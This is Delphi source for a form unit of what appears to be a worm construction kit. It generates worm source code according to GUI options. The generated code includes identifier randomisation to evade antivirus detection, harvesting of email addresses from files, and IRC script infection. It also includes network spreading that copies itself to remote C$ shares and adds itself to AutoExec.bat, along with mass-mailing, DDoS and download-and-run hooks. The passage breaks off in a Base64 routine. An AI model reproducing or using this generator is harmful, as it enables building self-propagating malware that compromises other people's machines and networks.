unit Unit8;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, ExtCtrls, ComCtrls;

type
  TForm8 = class(TForm)
    Memo1: TMemo;
    Button1: TButton;
    ProgressBar1: TProgressBar;
    Memo2: TMemo;
    Procedure Build(Nam:String);
    procedure Button1Click(Sender: TObject);
    procedure FormCloseQuery(Sender: TObject; var CanClose: Boolean);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form8: TForm8;
  Name : String;
  Bt   : longword;

implementation

uses Unit1, Unit2, Unit3, Unit4, Unit5, Unit6, Unit7, Unit10, Unit11;

{$R *.dfm}

Function RandUnd:String;
var
 A:String;
 i:Integer;
Begin
 Result := '';
 A := '_abcdefghijklmnopqrstuvwxyz';
 Randomize;
 I := Random(7)+2;
 While I > 0 Do Begin
  Result := Result + Copy(A, Random(Length(A)+1), 1);
  Dec(I);
  Sleep(300);
 End;
End;

Procedure SvFile(S,T:String);
Var
 F      :TextFile;
Begin
 AssignFile(F, S);
 If FileExists(S) Then
  Append(F)
 Else
  ReWrite(F);
 WriteLn(F, T);
 CloseFile(F);
End;

Procedure Status(Str:String);
var
 tmp, dir : String;
begin

 If Pos(':', Str)>0 Then Begin
  Dir := Copy(Str, pos(':',Str)+2, Length(Str));
  If Length(Dir)>20 Then Begin
   Tmp := Copy(Dir, 4, Length(Dir));
   While Length(Tmp)>27 Do
    Tmp := Copy(Tmp, 2, Length(Tmp));
   Tmp := Copy(Dir, 1, 3) + '...' + Copy(Tmp, 4, Length(Tmp));
   Str := Copy(Str, 1 ,Pos(':', Str)-1) + Tmp;
  End;
 End;

 Form8.Memo1.Lines.Add(Str);
end;

Procedure BBuild;
Var
 I,j    :Integer;
 Dir    :String;
 tmp1,tmp2,tmp3,
 tmp4,tmp5,tmp6,
 tmp7,tmp8,tmp9,
 domains,mails,
 triple, quad,
 buf, filebuf, cc : string;
 und    :Boolean;
 m_sub, m_bod, m_att:string;
 systime:string;
 webdl:String;

 Str01, Sock1,
 SockInfo, WSADATA: string;
 ExitCode: dword;
Begin
 Form8.Progressbar1.Position :=  0;
 If Form1.CheckBox8.Checked Then Begin
  If Form4.ListView1.Items.Count <= 0 Then Begin
   Status('No mail-settings found');
   Form1.Enabled := true;
   form8.button1.enabled := true;
   Exit;
  End;
 End;

 If Form1.Edit3.Text = '' Then Begin
  If Form1.CheckBox14.Checked Then Begin
   Status('No site to visit choosen');
   Form1.Enabled := true;
   form8.button1.enabled := true;
   Exit;
  End;
 End;

 If Form1.CheckBox5.Checked Then Begin
  If Form2.ListView1.Items.Count <= 0 Then Begin
   Status('No Scan Files settings found');
   Form1.Enabled := true;
   form8.button1.enabled := true;
   Exit;
  End;
 End;

 If Form1.CheckBox15.Checked Then Begin
  If Form10.ListView1.Items.Count <= 0 Then Begin
   Status('No Visit Page settings found');
   Form1.Enabled := true;
   form8.button1.enabled := true;
   Exit;
  End;
 End;

 If Form1.CheckBox13.Checked Then Begin
  If Form11.edit1.text = '' Then Begin
   Status('No DDoS settings found');
   Form1.Enabled := true;
   form8.button1.enabled := true;
   Exit;
  End;
 End;

 If Form1.CheckBox9.Checked Then Begin
  If Form5.ListView1.Items.Count <= 0 Then Begin
   Status('No sharedrop-settings found');
   form8.button1.enabled := true;
   Form1.Enabled := true;
   Exit;
  End;
 End;

 If Form1.CheckBox10.Checked Then Begin
  If Form6.RichEdit1.Text = '' Then Begin
   Status('No irc script found');
   form8.button1.enabled := true;
   Form1.Enabled := true;
   Exit;
  End;
 End;

 If Name = '' Then name := Form1.Edit1.text;
 Und := False;
 If Form1.CheckBox1.Checked Then Und := True;
 If Und Then Status('Trying to write undetected source') Else
             Status('Writing source without trying to undetect it');
 Dir := ExtractFilePath(ParamStr(0));
 Dir := Dir + Name + '\';

 If (FileExists(Dir+Name+'.dpr')) or (FileExists(Dir+'ircbot.pas')) Then Begin
  Status('Deleteing : '+Dir+Name+'.dpr');
  DeleteFile(pChar(Dir+Name+'.dpr'));
  Status('Deleteing : '+Dir+'ircbot.pas');
  DeleteFile(pChar(Dir+'ircbot.pas'));
  RemoveDirectory(pChar(Dir));
 End;

 Status('Creating dir : '+Dir);
 If CreateDirectory(pChar(dir), Nil) Then
  Status('Successfully Created Dir')
 Else Begin
  Status('Error in creating dir, aborting...');
  form8.button1.enabled := true;
  Exit;
 End;
 Status('Creating : \'+Name+'\'+Name+'.dpr');
 Dir := Dir+Name+'.dpr';
 Try
  SvFile(Dir, 'Program '+Name+';');
 Except
  Status('Creating Failed ... Aborting');
  form8.button1.enabled := true; 
  Exit;
 End;
 SvFile(Dir, '');
 Status('');

 Status('Including Libraries');
 If Form1.StatusBar1.Panels[0].Text = 'Libraries : Windows' Then Begin
  Status('Uses Windows;');
  SvFile(Dir, 'Uses');
  If form1.CheckBox11.Checked Then
  SvFile(Dir, ' Windows, ircbot;')
  else
  SvFile(Dir, ' Windows;');
 End Else Begin
  Status('Uses Windows, Winsock');
  SvFile(Dir, 'Uses');
  If form1.CheckBox11.Checked Then
  SvFile(Dir, ' Windows, Winsock, ircbot;')
  else
   SvFile(Dir, ' Windows, Winsock;');
 End;
 SvFile(Dir, '');
 Status('');
 Form8.Progressbar1.Position :=  5;
 Status('Declaring types');
 If (Form1.CheckBox5.checked) or (Form1.CheckBox6.checked) or
    (Form1.CheckBox7.checked) or (Form1.CheckBox9.checked) or
    (Form1.CheckBox10.checked)or (Form1.CheckBox3.Checked) Then
     SvFile(Dir,'TYPE');

  If Form1.CheckBox3.Checked Then Begin
   Status('Declaring Base64 Type');
   If Und Then Triple := RandUnd Else Triple := 'Triple';
   If Und Then Quad := RandUnd Else Quad := 'Quad';
   If Triple = Quad Then
    Repeat
     If Und Then Quad := RandUnd Else Quad := 'Quad';
    Until Triple <> Quad;
   SvFile(Dir, ' '+Triple+' = ARRAY[1..3] OF BYTE;');
   SvFile(Dir, ' '+Quad+'   = ARRAY[1..4] OF BYTE;');
   SvFile(Dir, '');
  End;
 If (Form1.CheckBox5.checked) or (Form1.CheckBox6.checked) or
    (Form1.CheckBox7.checked) or (Form1.CheckBox9.checked) or
    (Form1.CheckBox10.checked) Then Begin

   SvFile(Dir, ' TFileName = type string;');
   SvFile(Dir, ' TSearchRec = record');
   SvFile(Dir, '  Time: Integer;');
   SvFile(Dir, '  Size: Integer;');
   SvFile(Dir, '  Attr: Integer;');
   SvFile(Dir, '  Name: TFileName;');
   SvFile(Dir, '  ExcludeAttr: Integer;');
   SvFile(Dir, '  FindHandle: THandle  platform;');
   SvFile(Dir, '  FindData: TWin32FindData  platform;');
   SvFile(Dir, ' end;');
   SvFile(Dir, '');
   SvFile(Dir, ' LongRec = packed record');
   SvFile(Dir, '  case Integer of');
   SvFile(Dir, '  0: (Lo, Hi: Word);');
   SvFile(Dir, '  1: (Words: array [0..1] of Word);');
   SvFile(Dir, '  2: (Bytes: array [0..3] of Byte);');
   SvFile(Dir, ' end;');
   SvFile(Dir, '');
 End;

 Status('');
 Status('Declaring consts');
 Status('Declaring Message Const');
 If Form1.Memo1.Text <> '' then Begin
  SvFile(Dir, 'Const');
  If Und Then Tmp1 := RandUnd Else Tmp1 := 'Mess';
  For I:=0 To Form1.Memo1.Lines.Count -1 Do
   If I = Form1.Memo1.Lines.Count-1 Then
    SvFile(Dir, ''''+Form1.Memo1.lines.strings[i]+''';')
   Else if I = 0 Then
    SvFile(Dir, ' '+Tmp1+' : String = '''+Form1.Memo1.lines.strings[i]+'''+')
   Else
    SvFile(Dir, ''''+Form1.Memo1.lines.strings[i]+'''+');

  Tmp1 := '';
 End;

 If (Form1.CheckBox5.checked) or (Form1.CheckBox6.checked) or
    (Form1.CheckBox7.checked) or (Form1.CheckBox9.checked) or
    (Form1.CheckBox10.checked) Then Begin
     SvFile(Dir, ' faReadOnly  = $00000001;');
     SvFile(Dir, ' faHidden    = $00000002;');
     SvFile(Dir, ' faSysFile   = $00000004;');
     SvFile(Dir, ' faVolumeID  = $00000008;');
     SvFile(Dir, ' faDirectory = $00000010;');
     SvFile(Dir, ' faArchive   = $00000020;');
     SvFile(Dir, ' faAnyFile   = $0000003F;');
    End;

 SvFile(Dir, '');
 Status('');
 Form8.Progressbar1.Position :=  10;
 Status('Declaring variables');
 If Not Form1.CheckBox2.Checked Then
  Status('No network-variables needed for declare')
 Else Begin
  Status('Declaring Network Variables');
  SvFile(Dir, 'VAR');
  If Und Then Domains := RandUnd Else Domains := 'Domains';
  SvFile(Dir, ' '+Domains+'      : String;');
  SvFile(Dir, '');
 End;

 If (Form1.checkbox4.checked) or (Form1.checkbox13.checked) or
    (Form1.checkbox14.checked) or (Form1.checkbox15.checked) then begin
 if not form1.checkbox2.Checked then
  svfile(dir, 'VAR');
 If Und Then WebDl := RandUnd Else WebDl := 'URLDownloadToFile';
 If Und Then SysTime := RandUnd Else SysTime := 'SYSTEMTIME';

 If (Form1.CheckBox4.Checked) or (form1.checkbox13.checked) Then
  SvFile(Dir, ' '+SYSTIME+'       : _SYSTEMTIME;');
 end;
 SvFile(Dir,'');

 If Not Form1.CheckBox3.Checked Then
  Status('No mailing-variables needed for declare')
 Else Begin
  Status('Declaring Base64 and Mail Variables');
  If (not Form1.CheckBox2.Checked) and (not Form1.checkbox4.checked) and (not Form1.checkbox13.checked) and
    (not Form1.checkbox14.checked) and (not Form1.checkbox12.checked) and (not Form1.checkbox15.checked) Then
   SvFile(Dir, 'VAR');
  If Und Then Tmp1 := RandUnd Else Tmp1 := 'Sys';
  If Und Then Tmp2 := RandUnd Else Tmp2 := 'Path_New';
  If Und Then Tmp3 := RandUnd Else Tmp3 := 'Th';
  If (Form1.CheckBox12.Checked) then begin
  SvFile(Dir, ' '+tmp1+':array[0..255]of char;');
  SvFile(Dir, ' '+tmp2+':string;');
  end;
  if Form1.CheckBox13.Checked Then
   SvFile(Dir, ' '+tmp3+':dword;');
  If Und Then mails := RandUnd Else Mails := 'Mails';
  If Und Then Buf := RandUnd Else Buf := 'Buf';
  If Und Then FileBuf := RandUnd Else FileBuf := 'FileBuf';
  If Und Then CC := RandUnd Else CC := 'CC';
  SvFile(Dir, ' '+Mails+'        : String;');
  SvFile(Dir, ' '+Buf+'          : Array[0..255] Of Char;');
  SvFile(Dir, ' '+FileBuf+'      : Array[0..1000000] Of Byte;');
  SvFile(Dir, ' '+CC+'           : String = ''ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='';');
  If Form1.CheckBox7.Checked Then Begin
   If Und Then m_sub := RandUnd Else m_sub := 'm_sub';
   If Und Then m_bod := RandUnd Else m_bod := 'm_bod';
   If Und Then m_att := RandUnd Else m_att := 'm_att';
   SvFile(Dir, ' '+m_sub+'      : String;');
   SvFile(Dir, ' '+m_bod+'      : String;');
   SvFile(Dir, ' '+m_att+'      : String;');
  End;
  SvFile(Dir, '');
  // Sub, From, body, Att, Ctyp
  // Cap, 0   , 1   , 2  , 3
  If Form1.CheckBox8.Checked Then Begin
   If Und Then Tmp1 := RandUnd Else Tmp1 := 'Bodies';
   If Und Then Tmp2 := RandUnd Else Tmp2 := 'Ctypz';
   If Und Then Tmp3 := RandUnd Else Tmp3 := 'Attachs';
   If Und Then Tmp4 := RandUnd Else Tmp4 := 'Subj';
   If Und Then Tmp5 := RandUnd Else Tmp5 := 'Fromz';
   Tmp6 := '';
   For I := 0 To Form4.ListView1.Items.Count -1 Do
    Tmp6 := Tmp6 + '''' + Form4.ListView1.Items[i].SubItems[1] + ''', '+#13#10;
   Tmp6 := Copy(Tmp6, 1, Length(Tmp6)-4);
   SvFile(Dir, Tmp1+' : Array[0..'+IntToStr(Form4.ListView1.Items.Count-1)+'] of String = ('+#13#10+tmp6+');');
   Tmp6 := '';
   For I := 0 To Form4.ListView1.Items.Count -1 Do
    Tmp6 := Tmp6 + '''' + Form4.ListView1.Items[i].SubItems[3] + ''', '+#13#10;
   Tmp6 := Copy(Tmp6, 1, Length(Tmp6)-4);
   SvFile(Dir, Tmp2+' : Array[0..'+IntToStr(Form4.ListView1.Items.Count-1)+'] of String = ('+#13#10+tmp6+');');
   Tmp6 := '';
   For I := 0 To Form4.ListView1.Items.Count -1 Do
    Tmp6 := Tmp6 + '''' + Form4.ListView1.Items[i].SubItems[2] + ''', '+#13#10;
   Tmp6 := Copy(Tmp6, 1, Length(Tmp6)-4);
   SvFile(Dir, Tmp3+' : Array[0..'+IntToStr(Form4.ListView1.Items.Count-1)+'] of String = ('+#13#10+tmp6+');');
   Tmp6 := '';
   For I := 0 To Form4.ListView1.Items.Count -1 Do
    Tmp6 := Tmp6 + '''' + Form4.ListView1.Items[i].Caption + ''', '+#13#10;
   Tmp6 := Copy(Tmp6, 1, Length(Tmp6)-4);
   SvFile(Dir, Tmp4+' : Array[0..'+IntToStr(Form4.ListView1.Items.Count-1)+'] of String = ('+#13#10+tmp6+');');
   Tmp6 := '';
   For I := 0 To Form4.ListView1.Items.Count -1 Do
    Tmp6 := Tmp6 + '''' + Form4.ListView1.Items[i].SubItems[0] + ''', '+#13#10;
   Tmp6 := Copy(Tmp6, 1, Length(Tmp6)-4);
   SvFile(Dir, Tmp5+' : Array[0..'+IntToStr(Form4.ListView1.Items.Count-1)+'] of String = ('+#13#10+tmp6+');');
   SvFile(Dir, '');
   Tmp1 := '';
   Tmp2 := '';
   Tmp3 := '';
   Tmp4 := '';
   Tmp5 := '';
   Tmp6 := '';
  End;
 End;

 If (Form1.checkbox4.checked) or (Form1.checkbox13.checked) or
    (Form1.checkbox14.checked) or (Form1.checkbox15.checked) then
  SvFile(Dir, ' function '+WebDl+'(Caller: cardinal; URL: PChar; FileName: PChar;Reserved: LongWord; StatusCB: cardinal):Longword; stdcall; external ''URLMON.DLL'' name ''URLDownloadToFileA'';');

 Status('');
 Form8.Progressbar1.Position :=  15;
 Status('Adding usefull functions');
 Status('Adding LowerCase Function');
 SvFile(Dir, ' Function LowerCase(const S: string): string;');
 SvFile(Dir, ' var');
 If Und Then Tmp1 := RandUnd Else Tmp1 := 'Len';
 SvFile(Dir, '  '+Tmp1+': Integer;');
 SvFile(Dir, ' begin');
 SvFile(Dir, '  '+Tmp1+' := Length(S);');
 SvFile(Dir, '  SetString(Result, PChar(S), '+Tmp1+');');
 SvFile(Dir, '  if '+Tmp1+' > 0 then CharLowerBuff(Pointer(Result), '+Tmp1+');');
 SvFile(Dir, ' end;');
 SvFile(Dir, '');
 Tmp1 := '';
 Status('LowerCase Function Added');
 Status('');
 Status('Adding FileSize Function');
 SvFile(Dir, ' Function FileSize(FileName: String): Int64;');
 SvFile(Dir, ' Var');
 If Und Then Tmp1 := RandUnd Else Tmp1 := 'H';
 If Und Then Tmp2 := RandUnd Else Tmp2 := 'FData';
 SvFile(Dir, '   '+Tmp1+': THandle;');
 SvFile(Dir, '   '+Tmp2+': TWin32FindData;');
 SvFile(Dir, ' Begin');
 SvFile(Dir, '   Result:= -1;');
 SvFile(Dir, '');
 SvFile(Dir, '   '+Tmp1+':= FindFirstFile(PChar(FileName), '+Tmp2+');');
 SvFile(Dir, '   If '+Tmp1+' <> INVALID_HANDLE_VALUE Then');
 SvFile(Dir, '   Begin');
 SvFile(Dir, '     Windows.FindClose('+Tmp1+');');
 SvFile(Dir, '     Result:= Int64('+Tmp2+'.nFileSizeHigh) Shl 32 + '+Tmp2+'.nFileSizeLow;');
 SvFile(Dir, '   End;');
 SvFile(Dir, ' End;');
 SvFile(Dir, '');
 Tmp1 := '';
 Tmp2 := '';
 Form8.Progressbar1.Position :=  20;
 Status('FileSize Function Added');
 Status('');
 Status('Adding ExtractFileName Function');
 SvFile(Dir, ' Function ExtractFileName(Str:String):String;');
 SvFile(Dir, ' Begin');
 SvFile(Dir, '  While Pos(''\'', Str)>0 Do');
 SvFile(Dir, '   Str := Copy(Str, Pos(''\'',Str)+1, Length(Str));');
 SvFile(Dir, '  Result := Str;');
 SvFile(Dir, ' End;');
 SvFile(Dir, '');
 Status('ExtractFileName Function Added');
 Status('');
 If (Form1.CheckBox5.Checked) or (Form1.CheckBox6.Checked) Then Begin
  Status('Adding GrabMail Function');
  SvFile(Dir, ' Function Grabmails(Filename:string):String;');
  SvFile(Dir, ' Var');
  SvFile(Dir, '  F:Textfile;');
  SvFile(Dir, '  L1,L2,Text:string;');
  SvFile(Dir, '  MAIL:String;');
  SvFile(Dir, '  H,E,i, A:Integer;');
  SvFile(Dir, '  ABC,ABC2:STRING;');
  SvFile(Dir, ' Label again;');
  SvFile(Dir, ' begin');
  SvFile(Dir, '');
  SvFile(Dir, '  ABC:=''abcdefghijklmnopqrstuvwxyz_-ABCDEFGHIJKLMNOPQRSTUVWXYZ'';');
  SvFile(Dir, '  ABC2:=''abcdefghijklmnopqrstuvwxyz_-ABCDEFGHIJKLMNOPQRSTUVWXYZ.'';');
  SvFile(Dir, '');
  SvFile(Dir, '  if FileSize(FileName) > 5000 then exit;');
  SvFile(Dir, '  CopyFile(Pchar(Filename),pchar(Filename+''_''),false);');
  SvFile(Dir, '');
  SvFile(Dir, '  AssignFile(F,Filename+''_'');');
  SvFile(Dir, '  try');
  SvFile(Dir, '   Reset(F);');
  SvFile(Dir, '  except');
  SvFile(Dir, '   exit;');
  SvFile(Dir, '  end;');
  SvFile(Dir, '  Read(F,L1);');
  SvFile(Dir, '  ReadLN(F,L2);');
  SvFile(Dir, '  Text:=L1;');
  SvFile(Dir, '  While NOt EOF(F) DO BEGIN');
  SvFile(Dir, '   Read(F,L1);');
  SvFile(Dir, '   ReadLN(F,L2);');
  SvFile(Dir, '   Text:=Text+''|''+L1;');
  SvFile(Dir, '  END;');
  SvFile(Dir, '  Closefile(F);');
  SvFile(Dir, '');
  SvFile(Dir, '  Deletefile(pchar(Filename+''_''));');
  SvFile(Dir, '');
  SvFile(Dir, '  if copy(text,1,2)=''MZ'' then exit;');
  SvFile(Dir, '');
  SvFile(Dir, '  text:=''|''+text+''|'';');
  SvFile(Dir, '  result:='''';');
  SvFile(Dir, '');
  SvFile(Dir, '  AGAIN:');
  SvFile(Dir, '');
  SvFile(Dir, '  IF pos(''@'',Text)>0 then begin');
  SvFile(Dir, '');
  SvFile(Dir, '   A:=Pos(''@'',Text)-1;');
  SvFile(Dir, '   if a =0 then a := 1;');
  SvFile(Dir, '   L1 := copy(text,a,1);');
  SvFile(Dir, '   L2 := copy(text,a+2,1);');
  SvFile(Dir, '   H := pos(L1,abc);');
  SvFile(Dir, '   E := pos(L2,abc2);');
  SvFile(Dir, '');
  SvFile(Dir, '   if (H = 0) or (e=0) then begin');
  SvFile(Dir, '    text:=copy(text,a+1,length(text));');
  SvFile(Dir, '    goto again;');
  SvFile(Dir, '   end;');
  SvFile(Dir, '');
  SvFile(Dir, '   While POS(Copy(TExt,a,1),ABC)>0 do begin');
  SvFile(Dir, '    A:=A-1;');
  SvFile(Dir, '   end;');
  SvFile(Dir, '');
  SvFile(Dir, '   a := a +1;');
  SvFile(Dir, '   Mail := copy(Text,a,length(text)); //grab start of mail.');
  SvFile(Dir, '   Mail := COpy(Mail,1,pos(''@'',mail)+2);');
  SvFile(Dir, '   i:= pos(MAIL,text)+length(mail);');
  SvFile(Dir, '');
  SvFile(Dir, '   While pos(copy(mail,length(mail),1),ABC2)>0 do begin');
  SvFile(Dir, '    Mail := mail+copy(text,i,1);');
  SvFile(Dir, '    i:=i+1;');
  SvFile(Dir, '   end;');
  SvFile(Dir, '');
  SvFile(Dir, '   if POS(copy(mail,length(mail),1),ABC2)=0 then');
  SvFile(Dir, '    Mail:=copy(mail,1,length(mail)-1);');
  SvFile(Dir, '');
  SvFile(Dir, '   Result := Result+#13#10+Mail;');
  SvFile(Dir, '   Text:=copy(text,pos(mail,text)+length(mail),length(text));');
  SvFile(Dir, '');
  SvFile(Dir, '   goto AGAIN;');
  SvFile(Dir, '  end;');
  SvFile(Dir, '');
  SvFile(Dir, ' end;');
  SvFile(Dir, '');
  Status('GrabEmail Function Added');
 End;
 Form8.Progressbar1.Position :=  20;
 Status('Adding ExtractFileExt Function');
 SvFile(Dir, ' Function ExtractFileExt(s:string):String;');
 SvFile(Dir, ' Begin');
 SvFile(Dir, '  While Pos(''.'', S)>0 Do');
 SvFile(Dir, '   S := Copy(S, pos(''.'', S)+1, Length(s));');
 SvFile(Dir, '  Result := S;');
 SvFile(Dir, ' End;');
 SvFile(Dir, '');
 Status('ExtractFileExt Function Added');
 Status('Adding FileExists Function');
 SvFile(Dir, ' function FileExists(const FileName: string): Boolean;');
 SvFile(Dir, ' var');
 If Und Then Tmp1 := RandUnd Else Tmp1 := 'Handle';
 If Und Then Tmp2 := RandUnd Else Tmp2 := 'FindData';
 SvFile(Dir, '   '+Tmp1+': THandle;');
 SvFile(Dir, '   '+Tmp2+': TWin32FindData;');
 SvFile(Dir, ' begin');
 SvFile(Dir, '   '+Tmp1+' := FindFirstFileA(PChar(FileName), '+Tmp2+');');
 SvFile(Dir, '   result:= '+Tmp1+' <> INVALID_HANDLE_VALUE;');
 SvFile(Dir, '   if result then');
 SvFile(Dir, '   begin');
 SvFile(Dir, '     CloseHandle('+Tmp1+');');
 SvFile(Dir, '   end;');
 SvFile(Dir, ' end;');
 SvFile(Dir, '');
 Tmp1 := '';
 Tmp2 := '';
 Status('FileExists Function Added');
 Status('');
 If (Form1.CheckBox10.Checked) and (form6.RichEdit1.Text <> '') Then Begin
  Status('Writing IRC Spread Function');
  SvFile(Dir, ' Procedure InfectIrc(F	:String);');
  SvFile(Dir, ' Var');
  If Und Then Tmp1 := RandUnd Else Tmp1 := 'irc';
  form8.memo2.text := form6.RichEdit1.Text;
  SvFile(Dir, '  '+Tmp1+': TextFile;');
  SvFile(Dir, ' Begin');
  SvFile(Dir, '  AssignFile('+Tmp1+', F);');
  SvFile(Dir, '  ReWrite('+Tmp1+');');
  For i := 0 to Form6.RichEdit1.Lines.Count -1 Do
   If Pos('%file%', lowercase(form6.RichEdit1.Lines.Strings[i]))>0 Then Begin
    Tmp2 := lowercase(form6.RichEdit1.Lines.Strings[i]);
    While Pos('%file%', Tmp2)>0 Do Begin
     J := Pos('%file%', Tmp2);
     Delete(Tmp2, J, 6);
     Insert('''+paramstr(0)+''', Tmp2, J);
    End;
    form6.RichEdit1.Lines.Strings[i] := Tmp2;
   End;
  For i := 0 to Form6.RichEdit1.Lines.Count -1 Do
   SvFile(Dir, '  WriteLn('+Tmp1+', '''+form6.RichEdit1.Lines.Strings[i]+''');');
  SvFile(Dir, '  CloseFile('+Tmp1+');');
  SvFile(Dir, ' End;');
  Status('IRC Spread Function Added');
  Status('');
  form6.RichEdit1.Text := form8.memo2.text;   
  Tmp1 := '';
  Tmp2 := '';
 End;
 Form8.Progressbar1.Position :=  25;
 If (Form1.CheckBox5.checked) or (Form1.CheckBox6.checked) or
    (Form1.CheckBox7.checked) or (Form1.CheckBox9.checked) or
    (Form1.CheckBox10.checked) Then Begin
     If Und Then Tmp1 := RandUnd Else Tmp1 := 'LocalFileTime';

     SvFile(Dir, ' function FindMatchingFile(var F: TSearchRec): Integer;');
     SvFile(Dir, ' var');
     SvFile(Dir, '  '+Tmp1+': TFileTime;');
     SvFile(Dir, ' begin');
     SvFile(Dir, '  with F do');
     SvFile(Dir, '   begin');
     SvFile(Dir, '    while FindData.dwFileAttributes and ExcludeAttr <> 0 do');
     SvFile(Dir, '     if not FindNextFile(FindHandle, FindData) then');
     SvFile(Dir, '      begin');
     SvFile(Dir, '       Result := GetLastError;');
     SvFile(Dir, '       Exit;');
     SvFile(Dir, '      end;');
     SvFile(Dir, '     FileTimeToLocalFileTime(FindData.ftLastWriteTime, '+Tmp1+');');
     SvFile(Dir, '     FileTimeToDosDateTime('+Tmp1+', LongRec(Time).Hi,');
     SvFile(Dir, '   LongRec(Time).Lo);');
     SvFile(Dir, '   Size := FindData.nFileSizeLow;');
     SvFile(Dir, '   Attr := FindData.dwFileAttributes;');
     SvFile(Dir, '   Name := FindData.cFileName;');
     SvFile(Dir, '  end;');
     SvFile(Dir, '  Result := 0;');
     SvFile(Dir, ' end;');
     Tmp1 := '';
     SvFile(Dir, ' procedure FindClose(var F: TSearchRec);');
     SvFile(Dir, ' begin');
     SvFile(Dir, '  if F.FindHandle <> INVALID_HANDLE_VALUE then');
     SvFile(Dir, '  begin');
     SvFile(Dir, '   Windows.FindClose(F.FindHandle);');
     SvFile(Dir, '   F.FindHandle := INVALID_HANDLE_VALUE;');
     SvFile(Dir, '  end;');
     SvFile(Dir, ' end;');
     SvFile(Dir, '');
     If Und Then Tmp1 := RandUnd Else Tmp1 := 'faSpecial';
     SvFile(Dir, ' function FindFirst(const Path: string; Attr: Integer;');
     SvFile(Dir, '                    var  F: TSearchRec): Integer;');
     SvFile(Dir, ' const');
     SvFile(Dir, '  '+Tmp1+' = faHidden or faSysFile or faVolumeID or faDirectory;');
     SvFile(Dir, ' begin');
     SvFile(Dir, '  F.ExcludeAttr := not Attr and '+Tmp1+';');
     SvFile(Dir, '  F.FindHandle := FindFirstFile(PChar(Path), F.FindData);');
     SvFile(Dir, '  if F.FindHandle <> INVALID_HANDLE_VALUE then');
     SvFile(Dir, '  begin');
     SvFile(Dir, '   Result := FindMatchingFile(F);');
     SvFile(Dir, '   if Result <> 0 then FindClose(F);');
     SvFile(Dir, '  end else');
     SvFile(Dir, '   Result := GetLastError;');
     SvFile(Dir, ' end;');
     SvFile(Dir, '');
     SvFile(Dir, ' function FindNext(var F: TSearchRec): Integer;');
     SvFile(Dir, ' begin');
     SvFile(Dir, '  if FindNextFile(F.FindHandle, F.FindData) then');
     SvFile(Dir, '   Result := FindMatchingFile(F)');
     SvFile(Dir, '  else');
     SvFile(Dir, '   Result := GetLastError;');
     SvFile(Dir, ' end;');
     Tmp1 := '';
 End;
 Form8.Progressbar1.Position :=  30;
 If Form1.CheckBox2.Checked Then Begin
  Status('Writing Network Spread function');
  SvFile(Dir, ' procedure Enumeration(aResource:PNetResource);');
  SvFile(Dir, ' var');
  If Und Then Begin
   Tmp1 := RandUnd;
   Tmp2 := RandUnd;
   Tmp3 := RandUnd;
   Tmp4 := RandUnd;
   Tmp5 := RandUnd;
  End Else Begin
   Tmp1 := 'aHandle';
   Tmp2 := 'k';
   Tmp3 := 'BufferSize';
   Tmp4 := 'Buffer';
   Tmp5 := 'i';
  End;
  SvFile(Dir, '  '+Tmp1+': THandle;');
  SvFile(Dir, '  '+Tmp2+', '+Tmp3+': DWORD;');
  SvFile(Dir, '  '+Tmp4+': array[0..1023] of TNetResource;');
  SvFile(Dir, '  '+Tmp5+': Integer;');
  SvFile(Dir, '  begin');
  SvFile(Dir, '   WNetOpenEnum(2,0,0,aResource,'+Tmp1+');');
  SvFile(Dir, '   '+Tmp2+':=1024;');
  SvFile(Dir, '   '+Tmp3+':=SizeOf('+Tmp4+');');
  SvFile(Dir, '   while WNetEnumResource('+Tmp1+','+Tmp2+',@'+Tmp4+','+Tmp3+')=0 do');
  SvFile(Dir, '   for '+Tmp5+':=0 to '+Tmp2+'-1 do');
  SvFile(Dir, '   begin');
  SvFile(Dir, '    if '+Tmp4+'['+Tmp5+'].dwDisplayType=RESOURCEDISPLAYTYPE_SERVER then');
  SvFile(Dir, '     '+Domains+' := '+Domains+' + copy(LowerCase('+Tmp4+'['+Tmp5+'].lpRemoteName),3,MAX_PATH) + #13#10;');
  SvFile(Dir, '    if '+Tmp4+'['+Tmp5+'].dwUsage>0 then');
  SvFile(Dir, '   Enumeration(@'+Tmp4+'['+Tmp5+'])');
  SvFile(Dir, '  end;');
  SvFile(Dir, '  WNetCloseEnum('+Tmp1+');');
  SvFile(Dir, ' end;');
  SvFile(Dir, '');
  Tmp1 := '';
  Tmp2 := '';
  Tmp3 := '';
  Tmp4 := '';
  Tmp5 := '';
  Form8.Progressbar1.Position :=  35;
  Status('Done Writing Network Spread function');
  Status('Writing Network Spread Main Function');
  SvFile(Dir, ' Procedure Network;');
  SvFile(Dir, ' Var');
  If Und Then Tmp1 := RandUnd Else Tmp1 := 'Name';
  If Und Then Tmp2 := RandUnd Else Tmp2 := 'Auto';
  SvFile(Dir, '  '+Tmp1+' : String;');
  SvFile(Dir, '  '+Tmp2+' : TextFile;');
  SvFile(Dir, ' Begin');
  SvFile(Dir, '  Enumeration(NIL);');
  SvFile(Dir, '  While '+Domains+' <> '''' Do Begin');
  SvFile(Dir, '   '+Tmp1+' := Copy('+Domains+', 1, Pos(#13#10, '+Domains+')-1);');
  SvFile(Dir, '   Try');
  SvFile(Dir, '    CopyFile(pChar(ParamStr(0)), pChar('+Tmp1+' + ''\C$\Setup.exe''), False);');
  SvFile(Dir, '    If FileExists(pChar('+Tmp1+' + ''\C$\AutoExec.bat'')) Then Begin');
  SvFile(Dir, '     AssignFile('+Tmp2+', '+Tmp1+' + ''\C$\AutoExec.bat'');');
  SvFile(Dir, '     Append('+Tmp2+');');
  SvFile(Dir, '     WriteLn('+Tmp2+', ''Setup.exe'');');
  SvFile(Dir, '     CloseFile('+Tmp2+');');
  SvFile(Dir, '    End;');
  SvFile(Dir, '   Except');
  SvFile(Dir, '    ;');
  SvFile(Dir, '   End;');
  SvFile(Dir, '   '+Domains+' := Copy('+Domains+', Pos(#13#10, '+Domains+')+2, Length('+Domains+'));');
  SvFile(Dir, '  End;');
  SvFile(Dir, ' End;');
  SvFile(Dir, '');
  Status('Done Writing Network Spread Main Function');
 End Else
  Status('No Network Spread Selected');
 Status('');
 Form8.Progressbar1.Position :=  40;
 If Form1.CheckBox3.Checked Then Begin
  Status('Writing Base64 Encode Procedure 1');
  SvFile(Dir, '// Base64 source, written by Positron');
  SvFile(Dir, '// www.positronvx.cjb.net');
  SvFile(Dir, ' FUNCTION Codeb64(Count:BYTE;T:'+Triple+') : STRING;');
